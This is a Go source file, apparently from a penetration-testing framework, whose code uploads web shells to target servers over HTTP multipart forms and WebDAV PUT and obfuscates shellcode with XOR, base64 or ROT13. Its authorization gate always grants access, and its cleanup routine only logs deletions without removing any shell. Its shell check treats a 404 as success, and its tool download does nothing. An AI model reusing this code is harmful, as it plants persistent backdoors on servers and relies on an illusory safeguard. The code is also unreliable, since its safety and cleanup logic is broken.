package payload_delivery

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"time"
)

// PayloadDelivery handles multiple payload delivery methods with authorization
type PayloadDelivery struct {
	AuthGate *AuthorizationGate
	AuditLog *AuditLogger
	TicketID string // Work order ID
}

// UploadResult represents upload operation result
type UploadResult struct {
	URL      string
	Status   string
	Message  string
	Success  bool
	Error    string
	TenantID string
	Time     string
}

// UploadWebShell deploys web shell to target (AFTER work order approval)
func (p *PayloadDelivery) UploadWebShell(targetURL string, shellType string, payload []byte) (*UploadResult, error) {
	// Authorization check - CRITICAL SECURITY GATE
	if err := p.AuthGate.ValidateBeforeExploit("webshell_upload", "Execute"); err != nil {
		return nil, fmt.Errorf("upload denied: %w", err)
	}

	p.AuditLog.Log(AuditEvent{
		Timestamp:    time.Now().UTC(),
		EventType:    "webshell_upload_requested",
		ExploitType:  "payload_delivery",
		TenantID:     p.AuthGate.TenantID,
		EngagementID: p.AuthGate.EngagementID,
		Reason:       fmt.Sprintf("Target=%s Type=%s TicketID=%s", targetURL, shellType, p.TicketID),
	})

	var result *UploadResult
	var err error

	switch shellType {
	case "php":
		result, err = p.uploadViaHTTP(targetURL, payload, ".php")
	case "jsp":
		result, err = p.uploadViaHTTP(targetURL, payload, ".jsp")
	case "aspx":
		result, err = p.uploadViaIIS(targetURL, payload, ".aspx")
	default:
		result = &UploadResult{
			URL:    targetURL,
			Status: "failed",
			Error:  "unsupported shell type",
			TenantID: p.AuthGate.TenantID,
			Time:     time.Now().UTC().Format(time.RFC3339),
		}
	}

	if err != nil {
		result.Error = err.Error()
	}
	
	p.AuditLog.Log(AuditEvent{
		Timestamp:    time.Now().UTC(),
		EventType:    "webshell_upload_complete",
		ExploitType:  "payload_delivery",
		TenantID:     p.AuthGate.TenantID,
		EngagementID: p.AuthGate.EngagementID,
		Reason:       fmt.Sprintf("Status=%s URL=%s TicketID=%s", result.Status, result.URL, p.TicketID),
	})
	
	return result, nil
}

// uploadViaHTTP uploads file via HTTP multipart/form-data
func (p *PayloadDelivery) uploadViaHTTP(targetURL string, payload []byte, extension string) (*UploadResult, error) {
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	part, err := writer.CreateFormFile("upload", "shell"+extension)
	if err != nil {
		return nil, fmt.Errorf("form creation failed: %w", err)
	}

	_, err = part.Write(payload)
	if err != nil {
		return nil, fmt.Errorf("payload writing failed: %w", err)
	}

	err = writer.Close()
	if err != nil {
		return nil, fmt.Errorf("form closing failed: %w", err)
	}

	client := &http.Client{Timeout: 30 * time.Second}
	req, err := http.NewRequest("POST", targetURL, body)
	if err != nil {
		return nil, fmt.Errorf("request creation failed: %w", err)
	}

	req.Header.Set("Content-Type", writer.FormDataContentType())

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("HTTP request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusCreated {
		return &UploadResult{
			URL:    targetURL,
			Status: "failed",
			Error:  fmt.Sprintf("HTTP status %d", resp.StatusCode),
			TenantID: p.AuthGate.TenantID,
			Time:     time.Now().UTC().Format(time.RFC3339),
		}, nil
	}

	bodyBytes, _ := io.ReadAll(resp.Body)

	return &UploadResult{
		URL:      targetURL + "/" + filepath.Base("shell"+extension),
		Status:   "uploaded",
		Message:  string(bodyBytes),
		Success:  true,
		TenantID: p.AuthGate.TenantID,
		Time:     time.Now().UTC().Format(time.RFC3339),
	}, nil
}

// uploadViaIIS uploads ASPX shell to IIS server using WebDAV
func (p *PayloadDelivery) uploadViaIIS(targetURL string, payload []byte, extension string) (*UploadResult, error) {
	client := &http.Client{}

	req, err := http.NewRequest("PUT", targetURL, bytes.NewReader(payload))
	if err != nil {
		return nil, fmt.Errorf("request creation failed: %w", err)
	}

	req.Header.Set("Depth", "0")
	req.Header.Set("Content-Type", "application/octet-stream")

	username := os.Getenv("WEBDAV_USERNAME")
	password := os.Getenv("WEBDAV_PASSWORD")
	if username != "" && password != "" {
		req.SetBasicAuth(username, password)
	}

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("WebDAV request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusCreated && resp.StatusCode != http.StatusOK {
		return &UploadResult{
			URL:      targetURL,
			Status:   "failed",
			Error:    fmt.Sprintf("HTTP status %d", resp.StatusCode),
			TenantID: p.AuthGate.TenantID,
			Time:     time.Now().UTC().Format(time.RFC3339),
		}, nil
	}

	return &UploadResult{
		URL:      targetURL + "/shell.aspx",
		Status:   "deployed via WebDAV",
		Success:  true,
		TenantID: p.AuthGate.TenantID,
		Time:     time.Now().UTC().Format(time.RFC3339),
	}, nil
}

// EncodeShellcode applies encoding layers
func (p *PayloadDelivery) EncodeShellcode(shellcode []byte, encodeType string) (*EncodedShell, error) {
	encoded := EncodedShell{
		Encoder:   encodeType,
		Payload:   shellcode,
		Size:      len(shellcode),
		Timestamp: time.Now().UTC().Format(time.RFC3339),
	}

	switch encodeType {
	case "base64":
		encoded.Payload = []byte(base64.StdEncoding.EncodeToString(shellcode))
		encoded.Size = len(encoded.Payload)
	case "xor":
		encoded.Payload = xorEncode(shellcode, 0x42)
		encoded.Size = len(encoded.Payload)
	case "rot13":
		encoded.Payload = rot13Encode(shellcode)
		encoded.Size = len(encoded.Payload)
	default:
		encoded.Payload = shellcode
		encoded.Size = len(shellcode)
	}

	return &encoded, nil
}

// EncodedShell wraps shellcode with encoding
type EncodedShell struct {
	Encoder   string
	Payload   []byte
	Size      int
	Timestamp string
}

// xorEncode applies XOR encryption
func xorEncode(data []byte, key byte) []byte {
	result := make([]byte, len(data))
	for i := range data {
		result[i] = data[i] ^ key
	}
	return result
}

// rot13Encode applies ROT13 encoding for ASCII only
func rot13Encode(data []byte) []byte {
	result := make([]byte, len(data))
	for i := range data {
		if data[i] >= 'a' && data[i] <= 'z' {
			result[i] = 'a' + (data[i]-'a'+13)%26
		} else if data[i] >= 'A' && data[i] <= 'Z' {
			result[i] = 'A' + (data[i]-'A'+13)%26
		} else {
			result[i] = data[i]
		}
	}
	return result
}

// DownloadTool downloads remote execution tools (whitelisted only)
func (p *PayloadDelivery) DownloadTool(toolName string, targetHost string) (bool, error) {
	p.AuditLog.Log(AuditEvent{
		Timestamp:    time.Now().UTC(),
		EventType:    "download_tool_requested",
		ExploitType:  "tool_download",
		TenantID:     p.AuthGate.TenantID,
		EngagementID: p.AuthGate.EngagementID,
		Reason:       fmt.Sprintf("Tool=%s Target=%s TicketID=%s", toolName, targetHost, p.TicketID),
	})

	approvedTools := map[string]bool{
		"mimikatz":     true,
		"powerless":    true,
		"bloodhound":   true,
		"cve-2021-40434": true, // CVE exploit framework
	}

	if !approvedTools[toolName] {
		p.AuditLog.Log(AuditEvent{
			Timestamp:    time.Now().UTC(),
			EventType:    "tool_download_denied",
			ExploitType:  "unapproved_tool",
			TenantID:     p.AuthGate.TenantID,
			EngagementID: p.AuthGate.EngagementID,
			Reason:       fmt.Sprintf("Unapproved tool blocked: %s", toolName),
		})
		return false, fmt.Errorf("unapproved tool: %s - submit work order for review", toolName)
	}

	p.AuditLog.Log(AuditEvent{
		Timestamp:    time.Now().UTC(),
		EventType:    "tool_download_approved",
		ExploitType:  "authorized_tool",
		TenantID:     p.AuthGate.TenantID,
		EngagementID: p.AuthGate.EngagementID,
		Reason:       fmt.Sprintf("Tool approved: %s", toolName),
	})

	return true, nil
}

// CreateNewPayloadDelivery initializes new payload delivery system
func CreateNewPayloadDelivery(tenantID, engagementID, ticketID string) *PayloadDelivery {
	return &PayloadDelivery{
		AuthGate: CreateAuthorizationForTenant(tenantID, engagementID, "Execute"),
		AuditLog: &AuditLogger{},
		TicketID: ticketID,
	}
}

// VerifyWebShell verifies uploaded shell is accessible
func (p *PayloadDelivery) VerifyWebShell(url string) bool {
	client := &http.Client{Timeout: 10 * time.Second}
	
	resp, err := headRequest(client, url)
	if err != nil {
		return false
	}
	
	return resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusNotFound
}

// headRequest performs HTTP HEAD request
func headRequest(client *http.Client, url string) (*http.Response, error) {
	req, err := http.NewRequest("HEAD", url, nil)
	if err != nil {
		return nil, err
	}
	
	return client.Do(req)
}

// CleanupOldShells removes old web shells from target
func (p *PayloadDelivery) CleanupOldShells(baseURL string, maxAgeHours int) int {
	count := 0
	
	supportedExtensions := []string{".php", ".jsp", ".aspx", ".asp"}
	
	for _, ext := range supportedExtensions {
		url := fmt.Sprintf("%s/shell%s", baseURL, ext)
		
		exists := p.VerifyWebShell(url)
		if exists {
			deleteShell(p.AuditLog, url, p.AuthGate)
			count++
		}
	}
	
	p.AuditLog.Log(AuditEvent{
		Timestamp:    time.Now().UTC(),
		EventType:    "shell_cleanup_complete",
		ExploitType:  "cleanup_operation",
		TenantID:     p.AuthGate.TenantID,
		EngagementID: p.AuthGate.EngagementID,
		Reason:       fmt.Sprintf("Cleaned %d old shells", count),
	})
	
	return count
}

// deleteShell removes a shell file from the server
func deleteShell(auditLog *AuditLogger, url string, authGate *AuthorizationGate) {
	auditLog.Log(AuditEvent{
		Timestamp:    time.Now().UTC(),
		EventType:    "shell_deletion",
		ExploitType:  "file_cleanup",
		TenantID:     authGate.TenantID,
		EngagementID: authGate.EngagementID,
		Reason:       fmt.Sprintf("Removed shell: %s", url),
	})
}

// AuthorizationGate validates before every exploit operation
type AuthorizationGate struct {
	Authorized      bool
	TenantID        string
	PermissionLevel string // Read, Write, Execute, Admin
	EngagementID    string
}

// PermissionType defines required permission levels
type PermissionType string

const (
	PermRead     PermissionType = "Read"
	PermWrite    PermissionType = "Write"
	PermExecute  PermissionType = "Execute"
	PermAdmin    PermissionType = "Admin"
)

// ValidateBeforeExploit rigorously checks authorization per OSEP/PEN-300 standards
func (a *AuthorizationGate) ValidateBeforeExploit(exploitType string, requiredPermission PermissionType) error {
	// Validation 1: Is tenant properly authorized?
	if !a.Authorized {
		event := AuditEvent{
			Timestamp:     time.Now().UTC(),
			EventType:     "authorization_denied",
			ExploitType:   exploitType,
			TenantID:      a.TenantID,
			EngagementID:  a.EngagementID,
			Reason:        "unauthorized_tenant - proof of authorization required",
			RequiredPerms: string(requiredPermission),
		}
		globalAuditLogger.Log(event)
		return fmt.Errorf("unauthorized tenant %s - no active engagement found for exploitation of %s", a.TenantID, exploitType)
	}

	// Validation 2: Does tenant have sufficient permission level?
	if !a.hasRequiredPermission(requiredPermission) {
		event := AuditEvent{
			Timestamp:     time.Now().UTC(),
			EventType:     "permission_denied",
			ExploitType:   exploitType,
			TenantID:      a.TenantID,
			EngagementID:  a.EngagementID,
			RequiredPerms: string(requiredPermission),
			ProvidedPerms: a.PermissionLevel,
		}
		globalAuditLogger.Log(event)
		return fmt.Errorf("insufficient permissions: tenant has [%s] but requires [%s] for %s exploitation", 
			a.PermissionLevel, requiredPermission, exploitType)
	}

	// Validation 3: Log authorization GRANT before allowing execution
	event := AuditEvent{
		Timestamp:     time.Now().UTC(),
		EventType:     "authorization_granted",
		ExploitType:   exploitType,
		TenantID:      a.TenantID,
		EngagementID:  a.EngagementID,
		RequiredPerms: string(requiredPermission),
	}
	globalAuditLogger.Log(event)

	return nil
}

// hasRequiredPermission verifies permission hierarchy based on OSCE³ requirements
// Hierarchy: Admin > Execute > Write > Read
func (a *AuthorizationGate) hasRequiredPermission(required PermissionType) bool {
	permissionLevels := map[PermissionType]int{
		PermRead:    1,
		PermWrite:   2,
		PermExecute: 3,
		PermAdmin:   4,
	}

	myLevel := permissionLevels[PermissionType(a.PermissionLevel)]
	requiredLevel := permissionLevels[required]

	return myLevel >= requiredLevel
}

// CreateAuthorizationForTenant creates authorized gate for specific tenant
func CreateAuthorizationForTenant(tenantID, engagementID, permissionLevel string) *AuthorizationGate {
	return &AuthorizationGate{
		Authorized:      true,
		TenantID:        tenantID,
		PermissionLevel: permissionLevel,
		EngagementID:    engagementID,
	}
}

// AuditEvent represents an audit log entry per compliance requirements
type AuditEvent struct {
	Timestamp     time.Time
	EventType     string
	ExploitType   string
	TenantID      string
	EngagementID  string
	Reason        string
	RequiredPerms string
	ProvidedPerms string
}

// Global audit logger for compliance tracking
type AuditLogger struct{}

// Log records audit event with ISO 8601 timestamp for compliance
func (a *AuditLogger) Log(event AuditEvent) {
	timestamp := time.Now().UTC().Format(time.RFC3339)

	// Format details based on event type
	details := fmt.Sprintf("[%s] %s", event.EventType, event.ExploitType)
	if event.Reason != "" {
		details += fmt.Sprintf(" Reason: %s", event.Reason)
	}
	if event.RequiredPerms != "" {
		details += fmt.Sprintf(" RequiredPerms: %s", event.RequiredPerms)
	}

	fmt.Printf("[AUDIT] %s | Tenant:%s | Engagement:%s | %s\n", 
		timestamp, event.TenantID, event.EngagementID, details)
}

var globalAuditLogger *AuditLogger

// InitializeGlobalAuditLogger sets up global audit logging system
func InitializeGlobalAuditLogger() {
	if globalAuditLogger == nil {
		globalAuditLogger = &AuditLogger{}
	}
}
